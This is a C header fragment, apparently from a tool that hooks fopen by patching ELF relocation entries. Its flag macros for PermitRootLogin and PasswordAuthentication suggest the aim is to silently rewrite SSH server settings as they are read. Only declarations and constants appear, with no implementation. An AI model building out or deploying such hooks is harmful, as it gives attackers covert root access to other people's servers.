FILE *my_fopen(char *filename, char *mode);

FILE *(*ref_fopen)(char*, char*);

Elf64_Rela *ref_fopen_Rela;

int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append);
int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, char **buf, int *_buf_len);

static int hook_rela_addend(Elf64_Rela *foundrela, void *func);

/* aligned in vim, sorry... */
#define MASK_64 						0x0000000000000000

#define PermitRootLogin_EXPLICIT		0x0000000000000001
#define PermitRootLogin_APPEND			0x0000000000000010
#define PermitRootLogin_NOWORK			0x0000000000000011
#define PermitRootLogin_MASK			0x0000000000000011

#define PasswordAuthentication_EXPLICIT 0x0000000000000100
#define PasswordAuthentication_APPEND 	0x0000000000001000
#define PasswordAuthentication_NOWORK 	0x0000000000001100
#define PasswordAuthentication_MASK	 	0x0000000000001100
